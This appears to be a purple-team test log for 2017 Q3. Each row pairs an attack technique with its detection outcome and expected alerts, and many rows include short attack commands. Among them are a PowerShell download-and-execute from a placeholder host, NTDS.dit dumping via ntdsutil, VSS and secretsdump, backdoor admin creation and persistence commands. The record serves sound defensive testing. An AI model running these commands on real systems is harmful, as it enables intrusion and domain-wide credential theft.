File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,20 - Password-protected Office Doc - Standard CS payload,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T01:11:54.460Z,1501981914460,2017-08-06T02:39:33.460Z,1501987173460,2017-08-06T03:13:04.460Z,1501989184460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-14T08:33:44.460Z,1502699624460,2017-08-14T10:22:51.460Z,1502706171460,2017-08-14T11:56:22.460Z,1502711782460,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,Detected,High,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",Progear,2017-08-14T21:51:39.460Z,1502747499460,2017-08-14T22:54:18.460Z,1502751258460,2019-01-28T16:34:32.994Z,1548693272994,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR,Endpoint Protection",Progear,2017-08-14T18:14:20.460Z,1502734460460,2017-08-14T19:53:54.460Z,1502740434460,2019-01-28T16:29:11.191Z,1548692951191,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR,Endpoint Protection",,2017-08-15T00:43:43.460Z,1502757823460,2017-08-15T02:06:27.460Z,1502762787460,2017-08-15T03:52:24.460Z,1502769144460,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-14T13:46:46.460Z,1502718406460,2017-08-14T14:48:11.460Z,1502722091460,2017-08-14T16:46:31.460Z,1502729191460,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR,Endpoint Protection",Progear,2017-08-14T06:51:55.460Z,1502693515460,2017-08-14T08:18:58.460Z,1502698738460,2019-01-28T16:32:50.653Z,1548693170653,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 3,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-21T20:37:31.460Z,1503347851460,2017-08-21T20:47:28.460Z,1503348448460,2017-08-21T22:24:07.460Z,1503354247460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 1,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-21T15:32:48.460Z,1503329568460,2017-08-21T17:00:16.460Z,1503334816460,2017-08-21T17:24:33.460Z,1503336273460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 4,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-22T00:04:25.460Z,1503360265460,2017-08-22T01:08:25.460Z,1503364105460,2017-08-22T02:12:45.460Z,1503367965460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #2,,,Ransomware,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2017-08-22T06:34:47.460Z,1503383687460,2017-08-22T06:49:15.460Z,1503384555460,2017-08-22T07:12:02.460Z,1503385922460,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extension:
- kratos","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #1,,,Ransomware,Completed,Detected,High,TBD,TBD,,,,,"EDR,Endpoint Protection",Donpachi,2017-08-22T02:43:30.460Z,1503369810460,2017-08-22T04:35:00.460Z,1503376500460,2017-08-22T05:08:18.460Z,1503378498460,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extensions:
- locky
- ykcol","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 2,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-21T17:42:20.460Z,1503337340460,2017-08-21T19:03:42.460Z,1503342222460,2017-08-21T19:49:54.460Z,1503344994460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-08-17T01:41:58.460Z,1502934118460,2017-08-17T02:57:06.460Z,1502938626460,2017-08-17T03:48:09.460Z,1502941689460,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2017-08-17T04:45:04.460Z,1502945104460,2017-08-17T05:32:04.460Z,1502947924460,2017-08-17T07:14:39.460Z,1502954079460,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-08-16T19:56:00.460Z,1502913360460,2017-08-16T21:08:15.460Z,1502917695460,2017-08-16T22:09:59.460Z,1502921399460,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-08-16T23:02:51.460Z,1502924571460,2017-08-16T23:18:38.460Z,1502925518460,2017-08-17T00:02:17.460Z,1502928137460,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2017-08-13T21:50:42.460Z,1502661042460,2017-08-13T21:56:12.460Z,1502661372460,2017-08-13T22:11:39.460Z,1502662299460,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",Progear,2017-08-13T02:32:40.460Z,1502591560460,2017-08-13T04:19:29.460Z,1502597969460,2019-01-28T16:26:12.640Z,1548692772640,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-12T22:35:27.460Z,1502577327460,2017-08-12T23:25:10.460Z,1502580310460,2017-08-13T01:12:24.460Z,1502586744460,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",Progear,2017-08-13T23:37:44.460Z,1502667464460,2017-08-14T00:33:08.460Z,1502670788460,2019-01-28T16:26:41.131Z,1548692801131,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T09:52:11.460Z,1502617931460,2017-08-13T11:38:35.460Z,1502624315460,2017-08-13T12:45:29.460Z,1502628329460,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-14T03:49:55.460Z,1502682595460,2017-08-14T05:43:26.460Z,1502689406460,2017-08-14T06:51:45.460Z,1502693505460,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T06:45:10.460Z,1502606710460,2017-08-13T07:47:25.460Z,1502610445460,2017-08-13T08:35:12.460Z,1502613312460,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-13T01:38:59.460Z,1502588339460,2017-08-13T01:39:08.460Z,1502588348460,2017-08-13T02:12:56.460Z,1502590376460,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T14:12:30.460Z,1502633550460,2017-08-13T14:35:16.460Z,1502634916460,2017-08-13T14:46:49.460Z,1502635609460,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T18:25:58.460Z,1502648758460,2017-08-13T19:43:38.460Z,1502653418460,2017-08-13T20:08:00.460Z,1502654880460,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T14:50:45.460Z,1502635845460,2017-08-13T15:36:32.460Z,1502638592460,2017-08-13T16:39:00.460Z,1502642340460,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Sensitive API,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-08-03T20:20:29.460Z,1501791629460,2017-08-03T21:53:03.460Z,1501797183460,2017-08-03T22:01:28.460Z,1501797688460,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Enterprise Portal,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-08-03T18:41:37.460Z,1501785697460,2017-08-03T18:48:56.460Z,1501786136460,2017-08-03T19:56:15.460Z,1501790175460,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Web App Profiling,Reconnaissance,Directory Brute Force - Customer Web App,,,Web App Discovery,Completed,NotDetected,TBD,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall when a large number of HTTP requests are made to one or more external targets.,2) Web application logs are ingested into the SIEM and alerts triggered for suspicious activity (e.g. brute force attacks, large number of 400/500 status codes)",,,"Firewall,SIEM,WAF",,2017-08-03T16:05:47.460Z,1501776347460,2017-08-03T16:34:30.460Z,1501778070460,2017-08-03T18:23:38.460Z,1501784618460,Security Risk Advisors,,Enumerate files and directories on prominent external web apps.,,,High,Low,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-08-15T05:23:01.460Z,1502774581460,2017-08-15T05:35:20.460Z,1502775320460,2017-08-15T07:25:33.460Z,1502781933460,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,NotDetected,TBD,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",,2017-08-15T08:40:28.460Z,1502786428460,2017-08-15T08:49:30.460Z,1502786970460,2017-08-15T10:36:11.460Z,1502793371460,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-08-15T11:38:14.460Z,1502797094460,2017-08-15T12:46:42.460Z,1502801202460,2017-08-15T13:58:25.460Z,1502805505460,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q3,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-08-15T15:48:03.460Z,1502812083460,2017-08-15T16:10:41.460Z,1502813441460,2017-08-15T17:33:12.460Z,1502818392460,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via an unencrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2017-08-19T21:51:08.460Z,1503179468460,2017-08-19T22:53:05.460Z,1503183185460,2017-08-20T00:40:52.460Z,1503189652460,Security Risk Advisors,,Put unencrypted zip on USB drive,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via unencrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,"Email Gateway,DLP",,2017-08-20T17:21:27.460Z,1503249687460,2017-08-20T18:37:43.460Z,1503254263460,2017-08-20T19:06:34.460Z,1503255994460,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file to external email.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - SSN and CC,T1048,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,DLP,,2017-08-20T14:24:54.460Z,1503239094460,2017-08-20T14:52:35.460Z,1503240755460,2017-08-20T15:49:49.460Z,1503244189460,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Email an external recipient with an email that contians SSN and CC numbers.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,"Email sensitive data to external recipient using automated script (PII, PHI, others)",T1020,,Exfil data using email,Completed,Detected,High,TBD,TBD,,,,,DLP,Spriggan,2017-08-20T22:27:52.460Z,1503268072460,2017-08-20T22:42:50.460Z,1503268970460,2017-08-21T00:28:25.460Z,1503275305460,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Send an email with sensitive data in the body.,,Medium,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data using popular sites,T1048,,Exfil data using popular websites,Completed,NotDetected,TBD,TBD,No,,"1) Connections to popular online sites/cloud storage blocked by the proxy or firewall.,2) Attempts to exfil sensitive data over HTTP and HTTPS is detected in-line by DLP tools",,,"Web Gateway,DLP",,2017-08-20T07:51:40.460Z,1503215500460,2017-08-20T09:14:17.460Z,1503220457460,2017-08-20T10:44:29.460Z,1503225869460,Security Risk Advisors,,Extract data from the network using popular websites and cloud storage services.,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2017-08-20T00:57:07.460Z,1503190627460,2017-08-20T02:37:24.460Z,1503196644460,2017-08-20T03:36:45.460Z,1503200205460,Security Risk Advisors,,"Put encrypted zip or rar on USB drive, using AES encryption or other format.",,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Suspicious use of makecab,,,Data compression,Completed,NotDetected,TBD,TBD,No,,1) Suspicious use of makecab is detected by EDR and/or SIEM tool,,,"SIEM,EDR",,2017-08-20T04:37:08.460Z,1503203828460,2017-08-20T04:38:54.460Z,1503203934460,2017-08-20T06:11:09.460Z,1503209469460,Security Risk Advisors,,Using the built in makecab tool to compress files prior to exfiltration.,"makecab ""important_file.txt"" ""not_important_file.cab"" /L ""C:\Temp""",,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,Email Gateway,,2017-08-20T20:00:56.460Z,1503259256460,2017-08-20T20:24:10.460Z,1503260650460,2017-08-20T21:50:44.460Z,1503265844460,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file using email to an external email address.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - Names and DOBs,T1048,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,DLP,,2017-08-20T10:44:51.460Z,1503225891460,2017-08-20T11:19:04.460Z,1503227944460,2017-08-20T13:07:43.460Z,1503234463460,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Compose email with Names and DOB's and send to an external recipient.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Extract Password Hashes via NTDSUtil,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-08-18T19:24:28.460Z,1503084268460,2017-08-18T21:02:17.460Z,1503090137460,2017-08-18T21:16:25.460Z,1503090985460,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via NTDSUtils.,ntdsutil “ac in ntds” “ifm” “cr fu \\yourip\tmp” q q,,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Interactive Logon to a DC,T1078,,Compromise a DC,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to detect unusual logons to DCs from domain admin users and service accounts, potential detection of anomalous system access from UEBA tool",,,"SIEM,Behavior Analytics",,2017-08-18T07:13:04.460Z,1503040384460,2017-08-18T08:13:46.460Z,1503044026460,2017-08-18T08:34:10.460Z,1503045250460,Security Risk Advisors,,Perform anomalous interactive logons to a DC from privileged user and service accounts.  Once logged in establish persistent remote shell.,Use RDP to access DC and set up persistence,,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Extract Password Hashes via VSS,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-08-19T01:35:12.460Z,1503106512460,2017-08-19T01:35:21.460Z,1503106521460,2017-08-19T03:26:26.460Z,1503113186460,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services).,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin list shadows 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin create shadow /for=C: 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.hive 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Domain Controller Assault,Command & Control,Beacon SMB payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",,2017-08-18T15:29:37.460Z,1503070177460,2017-08-18T15:57:47.460Z,1503071867460,2017-08-18T15:58:07.460Z,1503071887460,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Generate SMB beacon and run on DC,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Extract password hashes from DC using DC replication / DCSync,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2017-08-18T21:57:04.460Z,1503093424460,2017-08-18T22:20:52.460Z,1503094852460,2017-08-19T00:14:47.460Z,1503101687460,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"Using impacket:
python secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>",,Medium,High,Internal,High,,,,
